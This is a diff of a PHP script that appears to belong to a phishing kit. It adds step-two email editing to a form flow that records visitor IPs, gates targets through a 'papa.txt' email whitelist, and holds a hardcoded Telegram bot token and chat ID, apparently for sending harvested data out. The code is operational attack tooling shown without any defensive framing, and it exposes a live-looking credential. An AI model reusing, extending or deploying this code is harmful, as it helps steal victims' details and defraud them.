@@ -3,7 +3,7 @@ session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
 // === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation
+$EMAIL_VALIDATION_ENABLED = false; // set to true to enforce whitelist in papa.txt
 
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
@@ -13,7 +13,7 @@ $whitelist_file     = __DIR__ . '/papa.txt';
 // Detect accurate visitor IP
 function get_client_ip() {
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
@@ -31,7 +31,40 @@ if (file_exists(ATTEMPTS_FILE)) {
  * (process first so Step 2 doesn't accidentally hit Turnstile/email block)
  */
 if (isset($_POST['name'])) {
-    $email = $_SESSION['old_email'] ?? '';
+
+    // --- NEW: allow email change on step 2 ---
+    if (isset($_POST['email'])) {
+        $emailCandidate = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
+        if (!$emailCandidate) {
+            $_SESSION['error_message'] = "Invalid email.";
+            header("Location: index.php"); exit;
+        }
+
+        // Optional: re-check whitelist if validation enabled
+        if ($EMAIL_VALIDATION_ENABLED) {
+            if (!file_exists($whitelist_file)) {
+                $_SESSION['error_message'] = "Configuration error: whitelist missing.";
+                header("Location: index.php"); exit;
+            }
+            $whitelist = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+            $whitelist = array_map('trim', $whitelist);
+
+            if (!in_array($emailCandidate, $whitelist, true)) {
+                $_SESSION['error_message'] = "Email not allowed.";
+                header("Location: index.php"); exit;
+            }
+        }
+
+        $email = $emailCandidate;
+        // Update session so it stays in sync
+        $_SESSION['old_email'] = $email;
+
+    } else {
+        // Fallback to original validated email
+        $email = $_SESSION['old_email'] ?? '';
+    }
+    // --- END NEW ---
+
     $name  = trim($_POST['name']);
 
     if (!$email || !$name) {
